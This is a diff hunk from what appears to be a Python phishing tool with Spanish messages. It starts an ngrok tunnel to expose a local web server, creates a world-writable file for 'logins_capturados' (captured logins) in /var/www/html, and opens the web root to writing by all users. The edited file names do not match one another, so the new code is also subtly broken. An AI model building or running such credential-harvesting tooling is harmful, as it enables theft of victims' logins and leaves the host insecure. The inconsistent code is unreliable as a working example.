@@ -37,12 +37,12 @@ try:
 	print('[*] iniciando ngrok')
 	os.system('echo ngrok http 80 > .ini_ngrok.sh && chmod +x .ini_ngrok.sh && xterm -C ./.ini_ngrok.sh 2> /dev/null &')
 
-	time.sleep(5)
+	time.sleep(9)
 
 	os.sys.stderr = temp
-	if not os.path.exists('/var/www/html/logins_encontrados'):
-		os.system('> /var/www/html/logins_encontrados.txt')
-	os.system('chmod a+w /var/www/html; chmod a+wr /var/www/html/logins_encontrados.txt')
+	if not os.path.exists('/var/www/html/logins_capturados'):
+		os.system('> /var/www/html/login_capturados.txt')
+	os.system('chmod a+w /var/www/html; chmod a+wr /var/www/html/logins_capturados.txt')
 
 	ngrok_html = urllib.urlopen('http://localhost:4040/status').read().split('"')
 	for i in range(len(ngrok_html)):
